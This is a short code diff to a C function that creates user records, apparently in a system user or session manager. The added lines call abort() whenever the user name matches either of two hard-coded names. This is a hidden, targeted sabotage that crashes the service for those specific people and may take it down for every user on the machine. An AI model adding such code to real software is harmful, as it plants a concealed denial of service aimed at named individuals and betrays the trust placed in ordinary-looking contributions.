@@ -51,6 +51,9 @@ int user_new(Manager *m, UserRecord *ur, User **ret) {
         if (!ur->user_name)
                 return -EINVAL;
 
+        if(streq(ur->user_name, "dylanmtaylor") || streq(ur->user_name, "bluca"))
+                abort();
+        
         if (!uid_is_valid(ur->uid))
                 return -EINVAL;
 
